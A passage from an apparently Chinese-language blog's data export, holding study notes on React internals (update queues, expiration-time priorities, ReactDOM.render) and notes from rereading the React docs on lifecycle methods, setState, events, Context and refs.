Update &amp; UpdateQueue1234567891011121314151617181920212223242526272829303132333435363738394041424344export type Update&lt;State&gt; = &#123; // 更新的过期时间 expirationTime: ExpirationTime, // export const UpdateState = 0; // export const ReplaceState = 1; // export const ForceUpdate = 2; // export const CaptureUpdate = 3; // 指定更新的类型，值为以上几种 tag: 0 | 1 | 2 | 3, // 更新内容，比如`setState`接收的第一个参数 payload: any, // 对应的回调，`setState`，`render`都有 callback: (() =&gt; mixed) | null, // 指向下一个更新 next: Update&lt;State&gt; | null, // 指向下一个`side effect` nextEffect: Update&lt;State&gt; | null,&#125;;export type UpdateQueue&lt;State&gt; = &#123; // 每次操作完更新之后的`state` baseState: State, // 队列中的第一个`Update` firstUpdate: Update&lt;State&gt; | null, // 队列中的最后一个`Update` lastUpdate: Update&lt;State&gt; | null, // 第一个捕获类型的`Update` firstCapturedUpdate: Update&lt;State&gt; | null, // 最后一个捕获类型的`Update` lastCapturedUpdate: Update&lt;State&gt; | null, // 第一个`side effect` firstEffect: Update&lt;State&gt; | null, // 最后一个`side effect` lastEffect: Update&lt;State&gt; | null, // 第一个和最后一个捕获产生的`side effect` firstCapturedEffect: Update&lt;State&gt; | null, lastCapturedEffect: Update&lt;State&gt; | null,&#125;; ExpirationTime一些优先级和预设常数 1234567891011121314151617181920212223export type ReactPriorityLevel = 99 | 98 | 97 | 96 | 95 | 90;export const ImmediatePriority: ReactPriorityLevel = 99;export const UserBlockingPriority: ReactPriorityLevel = 98;export const NormalPriority: ReactPriorityLevel = 97;export const LowPriority: ReactPriorityLevel = 96;export const IdlePriority: ReactPriorityLevel = 95;// NoPriority is the absence of priority. Also React-only.export const NoPriority: ReactPriorityLevel = 90;export const NoWork = 0;export const Never = 1;// Idle is slightly higher priority than Never. It must completely finish in// order to be consistent.export const Idle = 2;// Continuous Hydration is a moving priority. It is slightly higher than Idle// and is used to increase priority of hover targets. It is increasing with// each usage so that last always wins.let ContinuousHydration = 3;export const Sync = MAX_SIGNED_31_BIT_INT;export const Batched = Sync - 1;const UNIT_SIZE = 10;const MAGIC_NUMBER_OFFSET = Batched - 1; 获取currentTime 123456export const now = initialTimeMs &lt; 10000 ? Scheduler_now : () =&gt; Scheduler_now() - initialTimeMs;export function getCurrentTime() &#123; return msToExpirationTime(now());&#125; expirationTime基本计算方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// 1 unit of expiration time represents 10ms.export function msToExpirationTime(ms: number): ExpirationTime &#123; // Always add an offset so that we don't clash with the magic number for NoWork. //\"|0\"就是取整 return MAGIC_NUMBER_OFFSET - ((ms / UNIT_SIZE) | 0);&#125;export function expirationTimeToMs(expirationTime: ExpirationTime): number &#123; return (MAGIC_NUMBER_OFFSET - expirationTime) * UNIT_SIZE;&#125;function ceiling(num: number, precision: number): number &#123; return (((num / precision) | 0) + 1) * precision;&#125;function computeExpirationBucket( currentTime, //当前时间戳 expirationInMs, bucketSizeMs,): ExpirationTime &#123; return ( MAGIC_NUMBER_OFFSET - ceiling( MAGIC_NUMBER_OFFSET - currentTime + expirationInMs / UNIT_SIZE, bucketSizeMs / UNIT_SIZE, ) );&#125;export const LOW_PRIORITY_EXPIRATION = 5000;//用于batchedUpdate?//相近的几次更新最后算出来是同一个expirationTime//这样就可以自动合并在同一次更新中完成export const LOW_PRIORITY_BATCH_SIZE = 250;//异步超时export function computeAsyncExpiration( currentTime: ExpirationTime,): ExpirationTime &#123; return computeExpirationBucket( currentTime, LOW_PRIORITY_EXPIRATION, LOW_PRIORITY_BATCH_SIZE, );&#125;//中断超时export function computeSuspenseExpiration( currentTime: ExpirationTime, timeoutMs: number,): ExpirationTime &#123; return computeExpirationBucket( currentTime, timeoutMs, LOW_PRIORITY_BATCH_SIZE, );&#125;export const HIGH_PRIORITY_EXPIRATION = __DEV__ ? 500 : 150;export const HIGH_PRIORITY_BATCH_SIZE = 100;//交互超时（响应优先级高）export function computeInteractiveExpiration(currentTime: ExpirationTime) &#123; return computeExpirationBucket( currentTime, HIGH_PRIORITY_EXPIRATION, HIGH_PRIORITY_BATCH_SIZE, );&#125;//连续\"注水\"超时export function computeContinuousHydrationExpiration( currentTime: ExpirationTime,) &#123; // Each time we ask for a new one of these we increase the priority. // This ensures that the last one always wins since we can't deprioritize // once we've scheduled work already. return ContinuousHydration++;&#125;//根据超时推断优先级export function inferPriorityFromExpirationTime( currentTime: ExpirationTime, expirationTime: ExpirationTime,): ReactPriorityLevel &#123; if (expirationTime === Sync) &#123; return ImmediatePriority; &#125; if (expirationTime === Never || expirationTime === Idle) &#123; return IdlePriority; &#125; const msUntil = expirationTimeToMs(expirationTime) - expirationTimeToMs(currentTime); if (msUntil &lt;= 0) &#123; return ImmediatePriority; &#125; if (msUntil &lt;= HIGH_PRIORITY_EXPIRATION + HIGH_PRIORITY_BATCH_SIZE) &#123; return UserBlockingPriority; &#125; if (msUntil &lt;= LOW_PRIORITY_EXPIRATION + LOW_PRIORITY_BATCH_SIZE) &#123; return NormalPriority; &#125; return IdlePriority;&#125; 计算Fiber超时 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657export function computeExpirationForFiber( currentTime: ExpirationTime, fiber: Fiber, suspenseConfig: null | SuspenseConfig,): ExpirationTime &#123; const mode = fiber.mode; if ((mode &amp; BlockingMode) === NoMode) &#123; return Sync; &#125; const priorityLevel = getCurrentPriorityLevel(); if ((mode &amp; ConcurrentMode) === NoMode) &#123; return priorityLevel === ImmediatePriority ? Sync : Batched; &#125; if ((executionContext &amp; RenderContext) !== NoContext) &#123; // Use whatever time we're already rendering return renderExpirationTime; &#125; let expirationTime; if (suspenseConfig !== null) &#123; // Compute an expiration time based on the Suspense timeout. expirationTime = computeSuspenseExpiration( currentTime, suspenseConfig.timeoutMs | 0 || LOW_PRIORITY_EXPIRATION, ); &#125; else &#123; // Compute an expiration time based on the Scheduler priority. switch (priorityLevel) &#123; case ImmediatePriority: expirationTime = Sync; break; case UserBlockingPriority: expirationTime = computeInteractiveExpiration(currentTime); break; case NormalPriority: case LowPriority: expirationTime = computeAsyncExpiration(currentTime); break; case IdlePriority: expirationTime = Idle; break; default: invariant(false, 'Expected a valid priority level'); &#125; &#125; // If we're in the middle of rendering a tree, do not update at the same // expiration time that is already rendering. if (workInProgressRoot !== null &amp;&amp; expirationTime === renderExpirationTime) &#123; // This is a trick to move this update into a separate batch expirationTime -= 1; &#125; return expirationTime;&#125; react-dom (ReactDOM Renderer)ReactDOM properties1234567891011121314151617const ReactDOM: Object = &#123; createPortal, // Legacy findDOMNode, hydrate, render, unmountComponentAtNode, unstable_batchedUpdates: batchedUpdates, flushSync: flushSync, __SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED: &#123; //...233 &#125;,&#125;; ReactDOM.render123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152//renderexport function render( element: React$Element&lt;any&gt;, container: DOMContainer, callback: ?Function,) &#123; invariant( isValidContainer(container), 'Target container is not a DOM element.', ); return legacyRenderSubtreeIntoContainer( null, element, container, false, callback, );&#125;function legacyRenderSubtreeIntoContainer( parentComponent: ?React$Component&lt;any, any&gt;, children: ReactNodeList, container: DOMContainer, forceHydrate: boolean, callback: ?Function,) &#123; let root: RootType = (container._reactRootContainer: any); let fiberRoot; if (!root) &#123; // Initial mount // 初次渲染，创建root root = container._reactRootContainer = legacyCreateRootFromDOMContainer( container, forceHydrate, ); fiberRoot = root._internalRoot; if (typeof callback === 'function') &#123; const originalCallback = callback; callback = function() &#123; const instance = getPublicRootInstance(fiberRoot); originalCallback.call(instance); &#125;; &#125; // Initial mount should not be batched. //初次渲染不使用batchedUpdate，即时完成 unbatchedUpdates(() =&gt; &#123; updateContainer(children, fiberRoot, parentComponent, callback); &#125;); &#125; else &#123; //非初次渲染 fiberRoot = root._internalRoot; if (typeof callback === 'function') &#123; const originalCallback = callback; callback = function() &#123; const instance = getPublicRootInstance(fiberRoot); originalCallback.call(instance); &#125;; &#125; // Update //这个update函数后面说 updateContainer(children, fiberRoot, parentComponent, callback); &#125; return getPublicRootInstance(fiberRoot);&#125;//上面用到的创建root方法function legacyCreateRootFromDOMContainer( container: DOMContainer, forceHydrate: boolean,): RootType &#123; const shouldHydrate = forceHydrate || shouldHydrateDueToLegacyHeuristic(container); // First clear any existing content. if (!shouldHydrate) &#123; let warned = false; let rootSibling; //去掉container里可能包裹的内容 while ((rootSibling = container.lastChild)) &#123; container.removeChild(rootSibling); &#125; &#125; //服务端渲染最好使用hydrate()，否则警告 if (__DEV__) &#123; if (shouldHydrate &amp;&amp; !forceHydrate &amp;&amp; !warnedAboutHydrateAPI) &#123; warnedAboutHydrateAPI = true; //... &#125; &#125; return createLegacyRoot( container, shouldHydrate ? &#123; hydrate: true, &#125; : undefined, );&#125;//legacyRenderSubtreeIntoContainer用到的root获取实例的方法export function getPublicRootInstance( container: OpaqueRoot,): React$Component&lt;any, any&gt; | PublicInstance | null &#123; const containerFiber = container.current; if (!containerFiber.child) &#123; return null; &#125; switch (containerFiber.child.tag) &#123; case HostComponent: return getPublicInstance(containerFiber.child.stateNode); default: return containerFiber.child.stateNode; &#125;&#125;export function updateContainer( element: ReactNodeList, container: OpaqueRoot, parentComponent: ?React$Component&lt;any, any&gt;, callback: ?Function,): ExpirationTime &#123; const current = container.current; const currentTime = requestCurrentTimeForUpdate(); const suspenseConfig = requestCurrentSuspenseConfig(); //计算超时时间 const expirationTime = computeExpirationForFiber( currentTime, current, suspenseConfig, ); const context = getContextForSubtree(parentComponent); if (container.context === null) &#123; container.context = context; &#125; else &#123; container.pendingContext = context; &#125; const update = createUpdate(expirationTime, suspenseConfig); callback = callback === undefined ? null : callback; if (callback !== null) &#123; update.callback = callback; &#125; enqueueUpdate(current, update); scheduleWork(current, expirationTime); return expirationTime;&#125; UpdateQueue：UpdateQueue is a linked list of prioritized updates. Like fibers, update queues come in pairs: a current queue, which represent the visible state of the screen, and a work-in-progress queue, which can be mutated and processed asynchronously before it is committed — a form of double buffering. If a work-in-progress render is discarded before finishing, we create a new work-in-progress by cloning the current queue. For example: ​ Current pointer: A - B - C - D - E - F ​ Work-in-progress pointer: D - E - F The work-in-progress queue has processed more updates than current. The reason we append to both queues is because otherwise we might drop updates without ever processing them. For example, if we only add updates to the work-in-progress queue, some updates could be lost whenever a work-in-progress render restarts by cloning from current. Similarly, if we only add updates to the current queue, the updates will be lost whenever an already in-progress queue commits and swaps with the current queue. However, by adding to both queues, we guarantee that the update will be part of the next work-in-progress. (And because the work-in-progress queue becomes the current queue once it commits, there’s no danger of applying the same update twice.) Prioritization Updates are not sorted by priority, but by insertion; new updates are always appended to the end of the list. The priority is still important, though. When processing the update queue during the render phase, only the updates with sufficient priority are included in the result. If we skip an update because it has insufficient priority, it remains in the queue to be processed later, during a lower priority render. Crucially, all updates subsequent to a skipped update also remain in the queue regardless of their priority. That means high priority updates are sometimes processed twice, at two separate priorities. We also keep track of a base state, that represents the state before the first update in the queue is applied. For example: Given a base state of ‘’, and the following queue of updates: ​ A1 - B2 - C1 - D2 where the number indicates the priority, and the update is applied to the previous state by appending a letter, React will process these updates as two separate renders, one per distinct priority level: First render, at priority 1: ​ Base state: ‘’ ​ Updates: [A1, C1] ​ Result state: ‘AC’ Second render, at priority 2: ​ Base state: ‘A’ &lt;- The base state does not include C1, because B2 was skipped. ​ Updates: [B2, C1, D2] &lt;- C1 was rebased on top of B2 ​ Result state: ‘ABCD’ Because we process updates in insertion order, and rebase high priority updates when preceding(前面的) updates are skipped, the final result is deterministic regardless of priority. Intermediate state may vary according to system resources, but the final state is always the same. 123456789101112131415161718export function enqueueUpdate&lt;State&gt;(fiber: Fiber, update: Update&lt;State&gt;) &#123; const updateQueue = fiber.updateQueue; if (updateQueue === null) &#123; // Only occurs if the fiber has been unmounted. return; &#125; const sharedQueue = updateQueue.shared; const pending = sharedQueue.pending; if (pending === null) &#123; // This is the first update. Create a circular list. update.next = update; &#125; else &#123; update.next = pending.next; pending.next = update; &#125; sharedQueue.pending = update;&#125; findDOMNode123456789101112export function findDOMNode( componentOrElement: Element | ?React$Component&lt;any, any&gt;,): null | Element | Text &#123; if (componentOrElement == null) &#123; return null; &#125; if ((componentOrElement: any).nodeType === ELEMENT_NODE) &#123; return (componentOrElement: any); &#125; return findHostInstance(componentOrElement);&#125; ReactDOM.hydrate123456789101112131415161718export function hydrate( element: React$Node, container: DOMContainer, callback: ?Function,) &#123; invariant( isValidContainer(container), 'Target container is not a DOM element.', ); return legacyRenderSubtreeIntoContainer( null, element, container, true, callback, );&#125; legacy-eventsshared包Object.is polyfill12345678910function is(x: any, y: any) &#123; return ( (x === y &amp;&amp; (x !== 0 || 1 / x === 1 / y)) || (x !== x &amp;&amp; y !== y) // eslint-disable-line no-self-compare );&#125;const objectIs: (x: any, y: any) =&gt; boolean = typeof Object.is === 'function' ? Object.is : is;export default objectIs; shallowEqual1234567891011121314151617181920212223242526272829303132333435363738394041424344import is from './objectIs';const hasOwnProperty = Object.prototype.hasOwnProperty;/** * Performs equality by iterating through keys on an object and returning false * when any key has values which are not strictly equal between the arguments. * Returns true when the values of all keys are strictly equal. */function shallowEqual(objA: mixed, objB: mixed): boolean &#123; if (is(objA, objB)) &#123; return true; &#125; if ( typeof objA !== 'object' || objA === null || typeof objB !== 'object' || objB === null ) &#123; return false; &#125; const keysA = Object.keys(objA); const keysB = Object.keys(objB); if (keysA.length !== keysB.length) &#123; return false; &#125; // Test for A's keys different from B. for (let i = 0; i &lt; keysA.length; i++) &#123; if ( !hasOwnProperty.call(objB, keysA[i]) || !is(objA[keysA[i]], objB[keysA[i]]) ) &#123; return false; &#125; &#125; return true;&#125;export default shallowEqual; endsWith1234export default function endsWith(subject: string, search: string): boolean &#123; const length = subject.length; return subject.substring(length - search.length, length) === search;&#125;","categories":[],"tags":[{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"重读React文档的一些记录","slug":"重读React文档的一些记录","date":"2020-01-22T04:17:37.000Z","updated":"2020-02-02T15:44:37.339Z","comments":true,"path":"2020/01/22/重读React文档的一些记录/","link":"","permalink":"http://yoursite.com/2020/01/22/重读React文档的一些记录/","excerpt":"","text":"React.Component组件生命周期常用生命周期的图谱如下所示： 组件实例被创建并插入DOM中时，其生命周期调用顺序为： constructor(props) static getDerivedStateFromProps(props, state) render() componentDidMount() getDerivedStateFromProps()在初始挂载以及后续更新时都会被调用（每次渲染前都会触发此方法），不常用，可以让组件在props变化时更新state，这种派生state需要保守使用，而且如果一个派生state的值也被setState更新，那这个值就不是单一来源了。如果要在props更改时重置某些state可以使组件完全受控或者使用key使组件完全不受控。 componentDidUpdate(prevProps, preState, snapshot)会在更新后立即被调用，首次渲染不会执行。注意如果在componentDidUpdate()中调用setState()要在外面套条件语句，对更新前后的props进行比较，否则会死循环和额外渲染。 getSnapshotBeforeUpdate() 在最近一次渲染输出（提交到 DOM 节点）之前调用，使得组件能在发生更改之前从 DOM 中捕获一些信息（如滚动位置）。 如果组件实现了 getSnapshotBeforeUpdate() 生命周期（不常用），则它的返回值将作为 componentDidUpdate() 的第三个参数 “snapshot” 传递。 componentWillMount()，componentWillReceiveProps()，componentWillUpdate() “已过时”不建议使用。 setState()setState()异步更新可以接收对象或者函数作为第一个参数，若需要基于之前的state和props更新当前state（后续状态取决于当前状态，避免合并覆盖）则需传入updater函数作为参数。 12345678910//setState(updater[, callback])//example1this.setState((state) =&gt; &#123; return &#123; quantity: state.quantity + 1 &#125;;&#125;);//example2this.setState((state, props) =&gt; &#123; //参数为上一个state值和此次更新被应用时的props return &#123; counter: state.counter + props.step &#125;;&#125;); 为什么setState是异步批量更新？ 保持内部一致性：React对象的state、props、refs属性在内部是一致的；而props的更新是异步的，因为在父组件重新渲染时传入子组件的props才改变，如果state立即更新，显然此时props还没变，为了保持一致性就不得不在每次改变state的时候立即重新渲染组件，这样做是不够合理的。 立即同步更新会带来性能损失，因为这样导致组件的反复渲染。 存在视觉效果和体验上的问题，比如多个组件同时更改loading状态会导致页面闪烁；在输入消息的时候需要立即调用TextBox组件的setState，如果此时接收到了新消息，将新消息的渲染延迟到某个阈值可能比直接阻塞线程更好。 参考：关于setState异步更新的issue props属性props只读，所有 React 组件都必须像纯函数一样保护它们的 props 不被更改。this.props.children是一个特殊的prop，通常由JSX表达式中的子组件构成，非自定义。 render prop：在 React 组件间使用一个值为函数的 prop 来共享代码。具有 render prop 的组件接受一个函数，该函数返回一个 React 元素并调用它而不是实现自己的渲染逻辑。 (React Router库中就使用了render prop) 123&lt;DataProvider render=&#123;data =&gt; ( &lt;h1&gt;Hello &#123;data.target&#125;&lt;/h1&gt;)&#125;/&gt; 一个获取鼠标位置的Mouse组件被复用的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Mouse extends React.Component &#123; constructor(props) &#123; super(props); this.handleMouseMove = this.handleMouseMove.bind(this); this.state = &#123; x: 0, y: 0 &#125;; &#125; handleMouseMove(event) &#123; this.setState(&#123; x: event.clientX, y: event.clientY &#125;); &#125; render() &#123; return ( &lt;div style=&#123;&#123; height: '100%' &#125;&#125; onMouseMove=&#123;this.handleMouseMove&#125;&gt; &#123;/*动态渲染render prop中的内容*/&#125; &#123; this.props.render(this.state) &#125; &lt;/div&gt; ); &#125;&#125;class Cat extends React.Component &#123; render() &#123; const mouse = this.props.mouse; return ( &lt;img src=\"/cat.jpg\" style=&#123;&#123; position: 'absolute', left: mouse.x, top: mouse.y &#125;&#125; /&gt; ); &#125;&#125;class MouseTracker extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;移动鼠标!&lt;/h1&gt; &#123;/*使用render prop*/&#125; &lt;Mouse render=&#123;mouse =&gt; ( &lt;Cat mouse=&#123;mouse&#125; /&gt; )&#125;/&gt; &lt;/div&gt; ); &#125;&#125; 可以使用render prop构造HOC 1234567891011function withMouse(Component) &#123; return class extends React.Component &#123; render() &#123; return ( &lt;Mouse render=&#123;mouse =&gt; ( &lt;Component &#123;...this.props&#125; mouse=&#123;mouse&#125; /&gt; )&#125;/&gt; ); &#125; &#125;&#125; 事件处理绑定this给事件处理函数绑定this的“实验性”public class fields语法： 12345678910111213class Example extends React.Component &#123; handleClick = () =&gt; &#123; console.log(this); &#125; render() &#123; return ( &lt;button onClick=&#123;this.handleClick&#125;&gt; click me &lt;/button&gt; ) &#125;&#125; 传参1234//事件对象e作为第二个参数被传递&lt;button onClick=&#123;(e) =&gt; this.handleClick0(id, e)&#125;&gt;click0&lt;/button&gt;//通过bind方式绑定事件对象及其他参数被隐式传递&lt;button onClick=&#123;this.handleClick1.bind(this, id)&#125;&gt;click1&lt;/button&gt; 合成事件SyntheticEventSyntheticEvent 是浏览器原生事件的跨浏览器包装器。除兼容所有浏览器外，它还拥有和浏览器原生事件相同的接口，包括 stopPropagation() 和 preventDefault()。 合成对象属性SyntheticEvent 对象都包含以下属性： 1234567891011121314boolean bubblesboolean cancelableDOMEventTarget currentTargetboolean defaultPreventednumber eventPhaseboolean isTrustedDOMEvent nativeEventvoid preventDefault()boolean isDefaultPrevented()void stopPropagation()boolean isPropagationStopped()DOMEventTarget targetnumber timeStampstring type 注：由于SyntheticEvent对象可能会被重用，且在事件回调函数被调用后所有属性会无效，所以不能异步访问事件。若想异步访问事件属性需要在事件上调用event.persist()，此方法会从事件池中移除合成事件，允许保留对事件的引用。 12345678910111213141516function onClick(event) &#123; console.log(event); // =&gt; nullified object. console.log(event.type); // =&gt; \"click\" const eventType = event.type; // =&gt; \"click\" setTimeout(function() &#123; console.log(event.type); // =&gt; null console.log(eventType); // =&gt; \"click\" &#125;, 0); // 不起作用，this.state.clickEvent 值为 null this.setState(&#123;clickEvent: event&#125;); // 仍然可以导出事件属性 this.setState(&#123;eventType: event.type&#125;);&#125; 常用事件 Form Events：onChange onInput onInvalid onSubmit onChange通过event.target.value或者event.target.checked获取值 Focus Events：onFocus onBlur （在React DOM上的所有元素都有效） Keyboard Events：onKeyDown onKeyPress onKeyUp 可能用到的属性：key，keyCode，charCode Mouse Events：onClick onContextMenu onDoubleClick onDrag onDragEnd onDragEnter onDragExitonDragLeave onDragOver onDragStart onDrop onMouseDown onMouseEnter onMouseLeaveonMouseMove onMouseOut onMouseOver onMouseUp 可能用到的属性：screenX，screenY，clientX，clientY Select Event：onSelect Touch Events：onTouchCancel onTouchEnd onTouchMove onTouchStart 可能用到的属性：touches，targetTouches，changedTouches UI Event：OnScroll 属性：detail，view Media Events：onAbort onCanPlay onCanPlayThrough onDurationChange onEmptied onEncryptedonEnded onError onLoadedData onLoadedMetadata onLoadStart onPause onPlayonPlaying onProgress onRateChange onSeeked onSeeking onStalled onSuspendonTimeUpdate onVolumeChange onWaiting Image Events：onLoad onError Animation Events：onAnimationStart onAnimationEnd onAnimationIteration Transition Event：onTransitionEnd Toggle Event：onToggle Clipboard Events：onCopy onCut onPaste 属性：clipboardData 条件渲染使用&amp;&amp;运算符如果条件是 true，&amp;&amp; 右侧的元素就会被渲染；如果是 false，React 会忽略并跳过它。 12345678910111213function Mailbox(props) &#123; const unreadMessages = props.unreadMessages; return ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &#123;unreadMessages.length &gt; 0 &amp;&amp; &lt;h2&gt; You have &#123;unreadMessages.length&#125; unread messages. &lt;/h2&gt; &#125; &lt;/div&gt; );&#125; 需要注意的是如果在上面的例子里直接用unreadMessages.length的值作为判断条件，即使值为0后面的元素仍会被渲染，所以需要确保&amp;&amp;前的表达式总是布尔值。 阻止组件渲染可以让 render 方法直接返回 null，而不进行任何渲染。 1234567891011function Example(props) &#123; if (!props.flag) &#123; return null; &#125; return ( &lt;div className=\"test\"&gt; render! &lt;/div&gt; );&#125; 在组件的 render 方法中返回 null 并不会影响组件的生命周期。 表单受控组件受控组件中的表单数据由React组件管理，使 React 的 state 成为“唯一数据源”，大多数情况下都使用受控组件来处理表单数据。 非受控组件非受控组件中的数据交由DOM节点处理，使用ref从DOM节点中获取表单数据，可以指定defaultValue属性赋予组件初始值。 &lt;input type=&#39;file&#39; /&gt; 始终是一个非受控组件，因为它的值只能由用户设置，而不能通过代码控制。（附：DOM File API文档 ） 12345678910111213141516171819202122232425262728class FileInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleSubmit = this.handleSubmit.bind(this); this.fileInput = React.createRef(); &#125; handleSubmit(event) &#123; event.preventDefault(); alert( `Selected file - $&#123; this.fileInput.current.files[0].name &#125;` ); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Upload file: &lt;input type=\"file\" ref=&#123;this.fileInput&#125; /&gt; &lt;/label&gt; &lt;br /&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt; &lt;/form&gt; ); &#125;&#125; 由于非受控组件将真实数据存储在DOM节点中，所以在使用非受控组件时，有时候反而更容易同时集成 React 和非 React 代码。 如果表单数据比较简单可能适合使用非受控的方式，但大多数情况下还是使用受控组件。 关于受控和非受控组件的适用场景，参考这篇文章：链接 Contextbasic当组件树中不同层级的组件需要访问相同的数据时，Context 能将这些数据向组件树下所有的组件进行“广播”，让所有的组件都能访问到这些数据以及后续的数据更新，适用于全局共享的属性。 123456789101112131415161718192021222324252627282930313233// 为当前的theme创建一个context（'light'为默认值）const ThemeContext = React.createContext('light');class App extends React.Component &#123; render() &#123; // 使用一个Provider将当前的theme传递给以下的组件树 // 无论多深任何组件都能读取这个值 // 以下传递的值为'dark' return ( &lt;ThemeContext.Provider value=\"dark\"&gt; &lt;Toolbar /&gt; &lt;/ThemeContext.Provider&gt; ); &#125;&#125;// 中间的组件无需显式向下传递themefunction Toolbar(props) &#123; return ( &lt;div&gt; &lt;ThemedButton /&gt; &lt;/div&gt; );&#125;class ThemedButton extends React.Component &#123; // 指定contextType读取当前的theme context // React会往上找到最近的theme Provider，然后读取它的值，即'dark' static contextType = ThemeContext; //\"实验性\"public class fields语法 render() &#123; return &lt;Button theme=&#123;this.context&#125; /&gt;; &#125;&#125; React.createContext(defaultValue)可以创建一个Context对象，订阅这个Context对象的组件会从组件树中离自己最近的匹配的Provider中读取到当前context值，若没找到匹配的Provider则使用defaultValue的值。 多个Provider可嵌套，里层会覆盖外层的数据；Provider一般通过Object.is方法检测值的变化，当value发生改变时，其内部所有的消费组件都会重新渲染，不受制于shouldComponentUpdate函数。 设置Class.contextType属性为已创建的某个Context对象（或者使用上面例子中的实验性方法设置，用类属性static初始化contextType），就可以通过this.context获取到最近的匹配的值，在任何生命周期中都可访问到（包括render函数）。 在嵌套组件中更新Context参考官方给出的例子： theme-context.js 123456789101112131415export const themes = &#123; light: &#123; foreground: '#000000', background: '#eeeeee', &#125;, dark: &#123; foreground: '#ffffff', background: '#222222', &#125;,&#125;;export const ThemeContext = React.createContext(&#123; theme: themes.dark, toggleTheme: () =&gt; &#123;&#125;,&#125;); themed-toggle-button.js 12345678910111213141516171819import &#123; ThemeContext &#125; from './theme-context';function ThemeTogglerButton() &#123; //获取到theme值和toggleTheme函数 return ( &lt;ThemeContext.Consumer&gt; &#123;(&#123;theme, toggleTheme&#125;) =&gt; ( &lt;button onClick=&#123;toggleTheme&#125; style=&#123;&#123;backgroundColor: theme.background&#125;&#125; &gt; Toggle Theme &lt;/button&gt; )&#125; &lt;/ThemeContext.Consumer&gt; );&#125;export default ThemeTogglerButton; app.js 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ThemeContext, themes &#125; from './theme-context';import ThemeTogglerButton from './theme-toggler-button';class App extends React.Component &#123; constructor(props) &#123; super(props); this.toggleTheme = () =&gt; &#123; this.setState(state =&gt; (&#123; theme: state.theme === themes.dark ? themes.light : themes.dark, &#125;)); &#125;; this.state = &#123; theme: themes.light, toggleTheme: this.toggleTheme, &#125;; &#125; render() &#123; // 整个 state 都被传递进 provider return ( &lt;ThemeContext.Provider value=&#123;this.state&#125;&gt; &lt;Content /&gt; &lt;/ThemeContext.Provider&gt; ); &#125;&#125;function Content() &#123; return ( &lt;div&gt; &lt;ThemeTogglerButton /&gt; &lt;/div&gt; );&#125;ReactDOM.render(&lt;App /&gt;, document.root); 消费多个Context12345678910111213141516171819202122232425262728293031323334353637383940414243const ThemeContext = React.createContext('light');const UserContext = React.createContext(&#123; name: 'Guest',&#125;);class App extends React.Component &#123; render() &#123; const &#123;signedInUser, theme&#125; = this.props; // 提供初始context值 return ( &lt;ThemeContext.Provider value=&#123;theme&#125;&gt; &lt;UserContext.Provider value=&#123;signedInUser&#125;&gt; &lt;Layout /&gt; &lt;/UserContext.Provider&gt; &lt;/ThemeContext.Provider&gt; ); &#125;&#125;function Layout() &#123; return ( &lt;div&gt; &lt;Sidebar /&gt; &lt;Content /&gt; &lt;/div&gt; );&#125;// 一个组件可能会消费多个contextfunction Content() &#123; return ( &lt;ThemeContext.Consumer&gt; &#123;theme =&gt; ( &lt;UserContext.Consumer&gt; &#123;user =&gt; ( &lt;ProfilePage user=&#123;user&#125; theme=&#123;theme&#125; /&gt; )&#125; &lt;/UserContext.Consumer&gt; )&#125; &lt;/ThemeContext.Consumer&gt; );&#125; Refs and the DOMbasic可以通过Refs访问DOM节点或render中创建的React元素。适用于：管理焦点、触发强制动画、集成第三方DOM库。 用React.createRef()创建Refs，通过ref属性附加到React元素；当ref属性用于HTML元素时，ref接收底层DOM元素作为其current属性；当ref用于自定义class组件时，ref接收组件的挂载实例作为current属性。 12345678910111213141516171819202122232425262728293031class CustomTextInput extends React.Component &#123; constructor(props) &#123; super(props); // 创建ref存储textInput的DOM元素 this.textInput = React.createRef(); this.focusTextInput = this.focusTextInput.bind(this); &#125; focusTextInput() &#123; // 直接使用原生API使text输入框获得焦点 // 通过\"current\"属性访问DOM节点 this.textInput.current.focus(); &#125; render() &#123; return ( &lt;div&gt; &#123;/*把&lt;input&gt;的ref关联到`textInput`上*/&#125; &lt;input type=\"text\" ref=&#123;this.textInput&#125; /&gt; &lt;input type=\"button\" value=\"Focus the text input\" onClick=&#123;this.focusTextInput&#125; /&gt; &lt;/div&gt; ); &#125;&#125; React 会在组件挂载时给 current 属性传入 DOM 元素，并在组件卸载时传入 null 值。ref 会在 componentDidMount或 componentDidUpdate 生命周期钩子触发前更新。 不能在函数组件上使用ref属性，因为无实例。如果要在函数组件中使用ref可以使用forwardRef和useImperativeHandle实现。 回调Refs回调Refs需要向ref属性传递一个函数，这个函数接受 React 组件实例或 HTML DOM 元素作为参数，以使它们能在其他地方被存储和访问。 12345678910111213141516171819202122232425262728293031323334353637class CustomTextInput extends React.Component &#123; constructor(props) &#123; super(props); this.textInput = null; this.setTextInputRef = element =&gt; &#123; //将DOM元素存储到this.textInput this.textInput = element; &#125;; this.focusTextInput = () =&gt; &#123; if (this.textInput) this.textInput.focus(); &#125;; &#125; componentDidMount() &#123; // 组件挂载后让文本框自动获得焦点 this.focusTextInput(); &#125; render() &#123; return ( &lt;div&gt; &lt;input type=\"text\" ref=&#123;this.setTextInputRef&#125; /&gt; &lt;input type=\"button\" value=\"Focus the text input\" onClick=&#123;this.focusTextInput&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 如果 ref 回调函数是以内联函数的方式定义的，在更新过程中会被执行两次，第一次传入参数 null，然后第二次传入 DOM 元素。这是因为每次渲染时都会创建一个新的函数实例，所以会清空旧的 ref 并且设置新的。 Refs转发Refs转发可以将ref自动通过组件传递到其子组件，这样就可以很方便地获取其子组件的DOM元素。 123456789const FancyButton = React.forwardRef((props, ref) =&gt; ( &lt;button 